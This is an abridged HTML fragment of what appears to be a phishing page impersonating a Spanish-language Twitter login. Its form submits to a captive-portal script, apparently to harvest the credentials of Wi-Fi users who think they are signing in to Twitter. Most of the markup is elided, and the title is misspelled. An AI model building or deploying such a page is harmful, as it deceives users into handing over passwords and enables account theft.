  ...
  <body>
    ...
    <div class="container">
      <div class="account-wall">
        ...
        <h1 class="text-center login-title">Iniciar sessión en Twitter</h1>
          ...
          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
            ...
            <div class="text-center terms-text1"><a href="#" class="url-color">¿Olvidaste tu contraseña?</a> · <a href="#" class="url-color">Regístrate en Twitter</a></div><br>
